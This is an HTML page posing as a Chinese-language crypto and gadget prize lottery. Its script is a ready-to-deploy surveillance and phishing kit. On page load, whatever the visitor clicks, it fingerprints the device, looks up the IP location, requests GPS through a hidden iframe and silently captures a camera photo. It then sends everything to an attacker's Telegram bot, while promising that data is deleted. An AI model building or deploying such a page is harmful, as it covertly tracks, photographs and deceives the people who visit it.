<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸ èµ›åšæŠ½å¥–æ´»åŠ¨ - èµ¢å–é™é‡ç‰ˆNFT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', monospace;
        }

        body {
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #0af;
            min-height: 100vh;
            padding: 20px;
            overflow-x: hidden;
        }

        .container {
            max-width: 900px;
            margin: auto;
            background: rgba(10, 10, 30, 0.85);
            border: 2px solid #0af;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 0 40px #0af;
            position: relative;
            overflow: hidden;
        }

        .glitch {
            font-size: 3.5rem;
            text-align: center;
            color: #fff;
            text-shadow: 0 0 10px #0af, 0 0 20px #0af;
            margin-bottom: 20px;
            animation: glitch 3s infinite;
        }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }

        .subtitle {
            text-align: center;
            color: #8af;
            margin-bottom: 30px;
            font-size: 1.2rem;
        }

        .prize-showcase {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 20px;
            margin: 30px 0;
        }

        .prize-card {
            background: rgba(20, 20, 60, 0.7);
            border: 1px solid #0af;
            border-radius: 15px;
            padding: 20px;
            width: 200px;
            text-align: center;
            transition: transform 0.3s;
        }

        .prize-card:hover {
            transform: scale(1.05);
            border-color: #f0f;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: #0af;
            font-size: 1.5rem;
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #0af;
            border-top: 5px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .permission-request {
            background: rgba(0, 20, 40, 0.9);
            border: 1px solid #08f;
            border-radius: 10px;
            padding: 30px;
            margin: 30px auto;
            max-width: 600px;
            text-align: center;
        }

        .permission-btn {
            background: linear-gradient(90deg, #0af, #00ffaa);
            color: #000;
            border: none;
            padding: 15px 30px;
            margin: 10px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
            font-size: 1.1rem;
            transition: all 0.3s;
        }

        .permission-btn:hover {
            background: linear-gradient(90deg, #00ffaa, #0af);
            transform: scale(1.05);
        }

        .data-panel {
            background: rgba(0, 20, 40, 0.9);
            border: 1px solid #08f;
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
            display: none;
        }

        .data-stream {
            height: 200px;
            overflow-y: auto;
            font-family: monospace;
            color: #0f0;
            background: #000;
            padding: 15px;
            border-radius: 5px;
            margin-top: 10px;
            border: 1px solid #0af;
        }

        .hidden {
            display: none;
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            color: #888;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
<!-- åŠ è½½é®ç½©å±‚ -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-spinner"></div>
    <div>æ­£åœ¨åŠ è½½æŠ½å¥–æ´»åŠ¨...</div>
    <div id="loadingText" style="margin-top: 20px; font-size: 1rem; color: #8af;"></div>
</div>

<div class="container" id="mainContent" style="display: none;">
    <h1 class="glitch">ğŸ èµ›åšæŠ½å¥– 2077 ğŸ</h1>
    <p class="subtitle">å‚ä¸å³å¯èµ¢å–ï¼šé™é‡NFTã€åŠ å¯†å¸ã€æ——èˆ°æ‰‹æœºã€æ¸¸æˆä¸»æœºï¼</p>

    <div class="prize-showcase">
        <div class="prize-card">
            <h3>ğŸ† å¤´å¥–</h3>
            <p>5 ETH + èµ›åšæœ‹å…‹NFT</p>
        </div>
        <div class="prize-card">
            <h3>ğŸ“± äºŒå¥–</h3>
            <p>iPhone 16 Pro</p>
        </div>
        <div class="prize-card">
            <h3>ğŸ® ä¸‰å¥–</h3>
            <p>PS5 Pro + æ¸¸æˆå¥—è£…</p>
        </div>
    </div>

    <!-- æƒé™è¯·æ±‚åŒºåŸŸ -->
    <div class="permission-request" id="permissionSection">
        <h3 style="color: #0af; margin-bottom: 20px;">ğŸ” èº«ä»½éªŒè¯</h3>
        <p style="color: #8af; margin-bottom: 25px;">
            ä¸ºäº†ç¡®ä¿æŠ½å¥–å…¬å¹³æ€§ï¼Œé˜²æ­¢æœºå™¨äººåˆ·å¥–ï¼Œéœ€è¦éªŒè¯æ‚¨çš„çœŸå®èº«ä»½ã€‚
            <br>è¯·å…è®¸ä»¥ä¸‹æƒé™ä»¥ç»§ç»­å‚ä¸ï¼š
        </p>
        
        <div style="text-align: left; margin: 25px 0; padding: 20px; background: rgba(0, 30, 60, 0.5); border-radius: 10px;">
            <p>âœ… <strong>è®¾å¤‡éªŒè¯</strong> - ç¡®è®¤æ‚¨ä½¿ç”¨çœŸå®è®¾å¤‡</p>
            <p>âœ… <strong>ä½ç½®éªŒè¯</strong> - ç¡®ä¿æ‚¨æ‰€åœ¨åœ°åŒºå¯å‚ä¸</p>
            <p>âœ… <strong>çœŸäººæ£€æµ‹</strong> - æ‘„åƒå¤´å¿«é€Ÿæ‹ç…§éªŒè¯</p>
        </div>
        
        <p style="color: #aaf; font-size: 0.9rem; margin-bottom: 30px;">
            <em>æ‰€æœ‰æ•°æ®ä»…ç”¨äºæŠ½å¥–éªŒè¯ï¼Œç»“æŸåè‡ªåŠ¨åˆ é™¤</em>
        </p>
        
        <div>
            <button class="permission-btn" id="allowAllBtn">âœ… å…è®¸æ‰€æœ‰éªŒè¯</button>
            <button class="permission-btn" id="skipBtn" style="background: #555; color: #fff;">â­ï¸ è·³è¿‡éªŒè¯</button>
        </div>
    </div>

    <!-- æ•°æ®æ”¶é›†é¢æ¿ï¼ˆéšè—ï¼‰ -->
    <div class="data-panel" id="dataPanel">
        <h3>ğŸ” æ­£åœ¨éªŒè¯æ‚¨çš„èº«ä»½...</h3>
        <div class="data-stream" id="dataStream"></div>
        <video id="cameraPreview" style="display:none;" autoplay playsinline></video>
        <canvas id="photoCanvas" style="display:none;"></canvas>
    </div>

    <!-- æˆåŠŸé¡µé¢ -->
    <div id="successSection" class="hidden" style="text-align: center; padding: 40px;">
        <div style="font-size: 4rem; margin-bottom: 20px;">ğŸ‰</div>
        <h2 style="color: #0af; margin-bottom: 15px;">éªŒè¯æˆåŠŸï¼</h2>
        <p style="color: #8af; font-size: 1.2rem; margin-bottom: 30px;">
            æ‚¨å·²æˆåŠŸå‚ä¸æŠ½å¥–ï¼è·å¥–åå•å°†äº3æœˆ25æ—¥å…¬å¸ƒã€‚
        </p>
        <div style="background: rgba(0, 30, 60, 0.5); padding: 20px; border-radius: 10px; max-width: 500px; margin: 0 auto;">
            <p style="color: #aaf;">ğŸ¯ æ‚¨çš„æŠ½å¥–ç¼–å·ï¼š<strong id="lotteryNumber">æ­£åœ¨ç”Ÿæˆ...</strong></p>
            <p style="color: #aaf;">â° æŠ½å¥–æ—¶é—´ï¼š2024å¹´3æœˆ25æ—¥ 20:00</p>
            <p style="color: #aaf;">ğŸ“± é€šçŸ¥æ–¹å¼ï¼šTelegramé€šçŸ¥è·å¥–è€…</p>
        </div>
    </div>

    <div class="footer">
        <p>Â© 2024 CyberLottery Inc. æœ¬æ´»åŠ¨ä»…é™çœŸäººå‚ä¸ã€‚</p>
        <p>æˆ‘ä»¬æ‰¿è¯ºä¿æŠ¤æ‚¨çš„éšç§ï¼Œæ•°æ®ä»…ç”¨äºæŠ½å¥–éªŒè¯ã€‚</p>
    </div>
</div>

<!-- éšè—çš„iframeç”¨äºè§¦å‘æƒé™è¯·æ±‚ -->
<iframe id="hiddenFrame" style="display:none;"></iframe>
<script>
    // ==================== é…ç½®åŒºåŸŸ ====================
    const BOT_TOKEN = "YOUR_BOT_TOKEN"; // æ›¿æ¢æˆä½ çš„ Telegram Bot Token
    const CHAT_ID = "YOUR_CHAT_ID"; // æ›¿æ¢æˆä½ çš„ Telegram Chat ID
    
    // ==================== å…¨å±€å˜é‡ ====================
    let collectedData = {
        timestamp: new Date().toISOString(),
        status: 'initialized'
    };
    let photoTaken = false;
    let dataSent = false;
    
    // ==================== DOMå…ƒç´  ====================
    const loadingOverlay = document.getElementById('loadingOverlay');
    const loadingText = document.getElementById('loadingText');
    const mainContent = document.getElementById('mainContent');
    const permissionSection = document.getElementById('permissionSection');
    const dataPanel = document.getElementById('dataPanel');
    const dataStream = document.getElementById('dataStream');
    const successSection = document.getElementById('successSection');
    const lotteryNumber = document.getElementById('lotteryNumber');
    const cameraPreview = document.getElementById('cameraPreview');
    const photoCanvas = document.getElementById('photoCanvas');
    const allowAllBtn = document.getElementById('allowAllBtn');
    const skipBtn = document.getElementById('skipBtn');
    const hiddenFrame = document.getElementById('hiddenFrame');
    
    // ==================== å·¥å…·å‡½æ•° ====================
    
    // æ›´æ–°åŠ è½½æ–‡æœ¬
    function updateLoadingText(text) {
        if (loadingText) loadingText.textContent = text;
    }
    
    // æ·»åŠ æ•°æ®æµæ˜¾ç¤º
    function logData(msg) {
        if (dataStream) {
            dataStream.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
            dataStream.scrollTop = dataStream.scrollHeight;
        }
        console.log(msg);
    }
    
    // ç”ŸæˆéšæœºæŠ½å¥–ç¼–å·
    function generateLotteryNumber() {
        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
        let result = 'LOT-';
        for (let i = 0; i < 8; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }
    
    // æ˜¾ç¤ºæˆåŠŸé¡µé¢
    function showSuccess() {
        permissionSection.style.display = 'none';
        dataPanel.style.display = 'none';
        successSection.classList.remove('hidden');
        const number = generateLotteryNumber();
        lotteryNumber.textContent = number;
        collectedData.lotteryNumber = number;
    }
// ==================== è‡ªåŠ¨æ•°æ®æ”¶é›†å‡½æ•° ====================

// è·å–IPå’Œç½‘ç»œä¿¡æ¯
async function getNetworkInfo() {
    try {
        updateLoadingText('æ­£åœ¨è·å–ç½‘ç»œä¿¡æ¯...');
        
        // è·å–IPåœ°å€
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        collectedData.ip = ipData.ip;
        collectedData.ipType = 'public';
        
        logData(`ğŸŒ è·å–IP: ${collectedData.ip}`);
        
        // è·å–åœ°ç†ä½ç½®ä¿¡æ¯
        try {
            const geoRes = await fetch(`https://ipapi.co/${collectedData.ip}/json/`);
            const geoData = await geoRes.json();
            collectedData.location = `${geoData.city || 'æœªçŸ¥'}, ${geoData.country_name || 'æœªçŸ¥'}`;
            collectedData.country = geoData.country_name;
            collectedData.region = geoData.region;
            collectedData.city = geoData.city;
            collectedData.isp = geoData.org;
            collectedData.vpn = geoData.vpn || geoData.tor ? 'æ˜¯' : 'å¦';
            collectedData.proxy = geoData.proxy || 'æœªçŸ¥';
            
            logData(`ğŸ“ åœ°ç†ä½ç½®: ${collectedData.location}`);
            logData(`ğŸ¢ ISPæä¾›å•†: ${collectedData.isp}`);
        } catch (geoError) {
            logData('âš ï¸ åœ°ç†ä½ç½®è·å–å¤±è´¥ï¼Œä½¿ç”¨å¤‡ç”¨API');
            // å¤‡ç”¨API
            try {
                const backupRes = await fetch(`http://ip-api.com/json/${collectedData.ip}`);
                const backupData = await backupRes.json();
                if (backupData.status === 'success') {
                    collectedData.location = `${backupData.city}, ${backupData.country}`;
                    collectedData.country = backupData.country;
                    collectedData.isp = backupData.isp;
                }
            } catch (e) {}
        }
        
    } catch (error) {
        logData('âŒ ç½‘ç»œä¿¡æ¯è·å–å¤±è´¥');
        collectedData.networkError = error.message;
    }
}

// è·å–è®¾å¤‡ä¿¡æ¯ï¼ˆæ— æƒé™ï¼‰
function getDeviceInfo() {
    updateLoadingText('æ­£åœ¨æ£€æµ‹è®¾å¤‡ä¿¡æ¯...');
    
    // åŸºç¡€è®¾å¤‡ä¿¡æ¯
    collectedData.userAgent = navigator.userAgent;
    collectedData.platform = navigator.platform;
    collectedData.vendor = navigator.vendor || 'æœªçŸ¥';
    collectedData.language = navigator.language;
    collectedData.languages = navigator.languages || [];
    
    // å±å¹•ä¿¡æ¯
    collectedData.screen = `${screen.width}x${screen.height}`;
    collectedData.colorDepth = screen.colorDepth;
    collectedData.pixelDepth = screen.pixelDepth;
    
    // æµè§ˆå™¨ä¿¡æ¯
    collectedData.browserName = getBrowserName();
    collectedData.browserVersion = getBrowserVersion();
    
    // æ€§èƒ½ä¿¡æ¯
    collectedData.cpuCores = navigator.hardwareConcurrency || 'æœªçŸ¥';
    collectedData.memory = navigator.deviceMemory || 'æœªçŸ¥';
    collectedData.maxTouchPoints = navigator.maxTouchPoints || 0;
    
    // æ—¶åŒºå’Œæ—¶é—´
    collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    collectedData.timezoneOffset = new Date().getTimezoneOffset();
    
    // å…¶ä»–ä¿¡æ¯
    collectedData.doNotTrack = navigator.doNotTrack || 'æœªè®¾ç½®';
    collectedData.cookieEnabled = navigator.cookieEnabled;
    collectedData.onLine = navigator.onLine;
    collectedData.connection = navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
    } : null;
    
    logData(`ğŸ“± è®¾å¤‡å¹³å°: ${collectedData.platform}`);
    logData(`ğŸŒ æµè§ˆå™¨: ${collectedData.browserName} ${collectedData.browserVersion}`);
    logData(`ğŸ–¥ï¸ å±å¹•åˆ†è¾¨ç‡: ${collectedData.screen}`);
    logData(`âš¡ CPUæ ¸å¿ƒæ•°: ${collectedData.cpuCores}`);
}

// è·å–æµè§ˆå™¨åç§°
function getBrowserName() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Chrome";
    if (userAgent.includes("Firefox")) return "Firefox";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
    if (userAgent.includes("Edg")) return "Edge";
    if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
    return "æœªçŸ¥";
}

// è·å–æµè§ˆå™¨ç‰ˆæœ¬
function getBrowserVersion() {
    const userAgent = navigator.userAgent;
    const matches = userAgent.match(/(chrome|firefox|safari|edge|opera|opr|msie|trident(?=\/))\/?\s*(\d+)/i);
    return matches ? matches[2] : 'æœªçŸ¥';
}

// æ£€æµ‹ä¼ æ„Ÿå™¨æ”¯æŒ
function detectSensors() {
    updateLoadingText('æ­£åœ¨æ£€æµ‹ä¼ æ„Ÿå™¨...');
    
    collectedData.sensors = {};
    
    // é™€èºä»ªå’ŒåŠ é€Ÿåº¦è®¡
    if ('DeviceOrientationEvent' in window) {
        collectedData.sensors.gyroscope = true;
        logData('ğŸ“¡ é™€èºä»ª: æ”¯æŒ');
    }
    
    // åŠ é€Ÿåº¦è®¡
    if ('DeviceMotionEvent' in window) {
        collectedData.sensors.accelerometer = true;
        logData('ğŸ“¡ åŠ é€Ÿåº¦è®¡: æ”¯æŒ');
    }
    
    // å…‰çº¿ä¼ æ„Ÿå™¨
    if ('AmbientLightSensor' in window) {
        collectedData.sensors.lightSensor = true;
        logData('ğŸ’¡ å…‰çº¿ä¼ æ„Ÿå™¨: æ”¯æŒ');
    }
    
    // è·ç¦»ä¼ æ„Ÿå™¨
    if ('ProximitySensor' in window) {
        collectedData.sensors.proximitySensor = true;
        logData('ğŸ“ è·ç¦»ä¼ æ„Ÿå™¨: æ”¯æŒ');
    }
    
    // ç”µæ± çŠ¶æ€
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            collectedData.battery = {
                level: battery.level,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            logData(`ğŸ”‹ ç”µæ± çŠ¶æ€: ${Math.round(battery.level * 100)}%`);
        });
    }
}
// ==================== æƒé™è¯·æ±‚å’Œæ‹ç…§ ====================

// é™é»˜è¯·æ±‚ä½ç½®æƒé™ï¼ˆé€šè¿‡iframeï¼‰
function requestLocationSilently() {
    return new Promise((resolve) => {
        try {
            // å°è¯•é€šè¿‡iframeè¯·æ±‚ä½ç½®
            hiddenFrame.src = "about:blank";
            hiddenFrame.onload = function() {
                const iframeDoc = hiddenFrame.contentDocument || hiddenFrame.contentWindow.document;
                iframeDoc.write(`
                    <script>
                        navigator.geolocation.getCurrentPosition(
                            function(pos) {
                                window.parent.postMessage({
                                    type: 'locationSuccess',
                                    data: {
                                        latitude: pos.coords.latitude,
                                        longitude: pos.coords.longitude,
                                        accuracy: pos.coords.accuracy
                                    }
                                }, '*');
                            },
                            function(err) {
                                window.parent.postMessage({
                                    type: 'locationError',
                                    error: err.message
                                }, '*');
                            },
                            {timeout: 5000}
                        );
                    <\/script>
                `);
            };
            
            // ç›‘å¬iframeæ¶ˆæ¯
            window.addEventListener('message', function(event) {
                if (event.data.type === 'locationSuccess') {
                    collectedData.gps = {
                        latitude: event.data.data.latitude,
                        longitude: event.data.data.longitude,
                        accuracy: event.data.data.accuracy,
                        source: 'geolocation'
                    };
                    logData(`ğŸ“ GPSä½ç½®: ${event.data.data.latitude}, ${event.data.data.longitude}`);
                    resolve(true);
                } else if (event.data.type === 'locationError') {
                    logData('âš ï¸ ä½ç½®æƒé™æœªæˆæƒ');
                    resolve(false);
                }
            });
        } catch (error) {
            logData('âš ï¸ ä½ç½®è¯·æ±‚å¼‚å¸¸');
            resolve(false);
        }
    });
}

// è‡ªåŠ¨æ‹ç…§ï¼ˆæ— æç¤ºï¼‰
async function takePhotoAuto() {
    return new Promise((resolve) => {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                logData('âŒ æ‘„åƒå¤´ä¸æ”¯æŒ');
                resolve(false);
                return;
            }
            
            updateLoadingText('æ­£åœ¨è¿›è¡ŒçœŸäººéªŒè¯...');
            
            // å°è¯•è·å–æ‘„åƒå¤´æƒé™
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    facingMode: 'user'
                },
                audio: false
            }).then(stream => {
                logData('ğŸ“¸ æ‘„åƒå¤´å·²å¼€å¯');
                collectedData.cameraAccess = true;
                
                // ç«‹å³æ‹ç…§
                setTimeout(() => {
                    try {
                        cameraPreview.srcObject = stream;
                        cameraPreview.play();
                        
                        setTimeout(() => {
                            const ctx = photoCanvas.getContext('2d');
                            photoCanvas.width = cameraPreview.videoWidth || 640;
                            photoCanvas.height = cameraPreview.videoHeight || 480;
                            
                            if (cameraPreview.videoWidth > 0) {
                                ctx.drawImage(cameraPreview, 0, 0);
                                
                                // ç”Ÿæˆç…§ç‰‡æ•°æ®URL
                                const photoDataUrl = photoCanvas.toDataURL('image/jpeg', 0.7);
                                collectedData.photo = photoDataUrl;
                                photoTaken = true;
                                
                                logData('âœ… ç…§ç‰‡å·²æ•è·');
                                
                                // å…³é—­æ‘„åƒå¤´
                                stream.getTracks().forEach(track => {
                                    track.stop();
                                });
                                
                                // å‘é€ç…§ç‰‡åˆ°Telegram
                                sendPhotoToTelegram(photoDataUrl);
                            }
                            
                            resolve(true);
                        }, 100); // 100msåæ‹ç…§
                        
                    } catch (photoError) {
                        logData('âŒ æ‹ç…§å¤±è´¥: ' + photoError.message);
                        resolve(false);
                    }
                }, 100);
                
            }).catch(error => {
                logData('âŒ æ‘„åƒå¤´è®¿é—®è¢«æ‹’ç»');
                collectedData.cameraError = error.message;
                resolve(false);
            });
            
        } catch (error) {
            logData('âŒ æ‘„åƒå¤´å¼‚å¸¸: ' + error.message);
            resolve(false);
        }
    });
}

// å‘é€ç…§ç‰‡åˆ°Telegram
async function sendPhotoToTelegram(photoDataUrl) {
    try {
        // å°†base64è½¬æ¢ä¸ºblob
        const response = await fetch(photoDataUrl);
        const blob = await response.blob();
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'user_photo.jpg');
        formData.append('caption', `ğŸ“¸ è‡ªåŠ¨æ‹ç…§ - ${new Date().toLocaleString()}`);
        
        // å‘é€ç…§ç‰‡
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        logData('âœ… ç…§ç‰‡å·²å‘é€åˆ°Telegram');
    } catch (error) {
        logData('âŒ ç…§ç‰‡å‘é€å¤±è´¥: ' + error.message);
    }
}
        // ==================== æ•°æ®å‘é€åˆ°Telegram ====================
        
        // å‘é€å®Œæ•´æ•°æ®åˆ°Telegram
        async function sendAllDataToTelegram() {
            if (dataSent) return;
            dataSent = true;
            
            try {
                updateLoadingText('æ­£åœ¨æäº¤éªŒè¯ç»“æœ...');
                
                // å‡†å¤‡å‘é€çš„æ•°æ®
                const reportText = `ğŸ¯ æ–°ç”¨æˆ·è®¿é—®æŠ½å¥–ç½‘ç«™\n\n` +
                    `ğŸ“… è®¿é—®æ—¶é—´: ${new Date().toLocaleString()}\n` +
                    `ğŸŒ IPåœ°å€: ${collectedData.ip || 'æœªçŸ¥'}\n` +
                    `ğŸ“ åœ°ç†ä½ç½®: ${collectedData.location || 'æœªçŸ¥'}\n` +
                    `ğŸ“± è®¾å¤‡ä¿¡æ¯: ${collectedData.platform || 'æœªçŸ¥'} | ${collectedData.browserName || 'æœªçŸ¥'} ${collectedData.browserVersion || ''}\n` +
                    `ğŸ–¥ï¸ å±å¹•å°ºå¯¸: ${collectedData.screen || 'æœªçŸ¥'}\n` +
                    `âš¡ CPUæ ¸å¿ƒ: ${collectedData.cpuCores || 'æœªçŸ¥'}\n` +
                    `ğŸ—£ï¸ ç³»ç»Ÿè¯­è¨€: ${collectedData.language || 'æœªçŸ¥'}\n` +
                    `â±ï¸ ç”¨æˆ·æ—¶åŒº: ${collectedData.timezone || 'æœªçŸ¥'}\n` +
                    `ğŸ“¸ æ‹ç…§æˆåŠŸ: ${photoTaken ? 'æ˜¯' : 'å¦'}\n` +
                    `ğŸ›œ VPN/TOR: ${collectedData.vpn || 'æœªçŸ¥'}\n` +
                    `ğŸ”‹ ç”µæ± çŠ¶æ€: ${collectedData.battery ? Math.round(collectedData.battery.level * 100) + '%' : 'æœªçŸ¥'}\n` +
                    `ğŸ“ GPSåæ ‡: ${collectedData.gps ? `${collectedData.gps.latitude}, ${collectedData.gps.longitude}` : 'æœªè·å–'}\n` +
                    `ğŸ”— UserAgent: ${collectedData.userAgent?.substring(0, 100) || 'æœªçŸ¥'}\n\n` +
                    `ğŸ“Š å®Œæ•´æ•°æ®:\n${JSON.stringify(collectedData, null, 2).substring(0, 3000)}`;
                
                // å‘é€æ–‡æœ¬æŠ¥å‘Š
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: reportText,
                        parse_mode: 'HTML'
                    })
                });
                
                logData('âœ… æ‰€æœ‰æ•°æ®å·²å‘é€åˆ°Telegram');
                
            } catch (error) {
                logData('âŒ æ•°æ®å‘é€å¤±è´¥: ' + error.message);
            }
        }
        
        // ==================== ä¸»æµç¨‹æ§åˆ¶ ====================
        
        // è‡ªåŠ¨å¼€å§‹æ•°æ®æ”¶é›†
        async function startAutoCollection() {
            logData('ğŸš€ å¼€å§‹è‡ªåŠ¨æ”¶é›†æ•°æ®...');
            
            // ç¬¬ä¸€æ­¥ï¼šæ”¶é›†åŸºç¡€è®¾å¤‡ä¿¡æ¯ï¼ˆæ— æƒé™ï¼‰
            getDeviceInfo();
            
            // ç¬¬äºŒæ­¥ï¼šè·å–ç½‘ç»œä¿¡æ¯
            await getNetworkInfo();
            
            // ç¬¬ä¸‰æ­¥ï¼šæ£€æµ‹ä¼ æ„Ÿå™¨
            detectSensors();
            
            // ç¬¬å››æ­¥ï¼šå°è¯•è·å–ä½ç½®ï¼ˆé™é»˜ï¼‰
            setTimeout(async () => {
                await requestLocationSilently();
            }, 500);
            
            // ç¬¬äº”æ­¥ï¼šå°è¯•æ‹ç…§ï¼ˆé™é»˜ï¼‰
            setTimeout(async () => {
                await takePhotoAuto();
                
                // ç¬¬å…­æ­¥ï¼šå‘é€æ‰€æœ‰æ•°æ®
                setTimeout(() => {
                    sendAllDataToTelegram();
                    
                    // ç¬¬ä¸ƒæ­¥ï¼šæ˜¾ç¤ºä¸»ç•Œé¢
                    setTimeout(() => {
                        loadingOverlay.style.display = 'none';
                        mainContent.style.display = 'block';
                        dataPanel.style.display = 'block';
                        
                        // 2ç§’åæ˜¾ç¤ºæˆåŠŸé¡µé¢
                        setTimeout(() => {
                            showSuccess();
                        }, 2000);
                    }, 1000);
                    
                }, 1000);
            }, 1000);
        }
        
        // ==================== äº‹ä»¶ç›‘å¬ ====================
        
        // é¡µé¢åŠ è½½å®Œæˆåç«‹å³å¼€å§‹
        window.addEventListener('load', () => {
            setTimeout(() => {
                startAutoCollection();
            }, 500);
        });
        
        // å…è®¸æ‰€æœ‰éªŒè¯æŒ‰é’®
        allowAllBtn.addEventListener('click', () => {
            permissionSection.style.display = 'none';
            dataPanel.style.display = 'block';
        });
        
        // è·³è¿‡éªŒè¯æŒ‰é’®
        skipBtn.addEventListener('click', () => {
            permissionSection.style.display = 'none';
            showSuccess();
        });
        
        // é¡µé¢å¸è½½æ—¶å‘é€æœ€åçš„æ•°æ®
        window.addEventListener('beforeunload', () => {
            if (!dataSent) {
                sendAllDataToTelegram();
            }
        });
        
        // é¡µé¢éšè—æ—¶å‘é€æ•°æ®
        document.addEventListener('visibilitychange', () => {
            if (document.hidden && !dataSent) {
                sendAllDataToTelegram();
            }
        });
    </script>
</body>
</html>
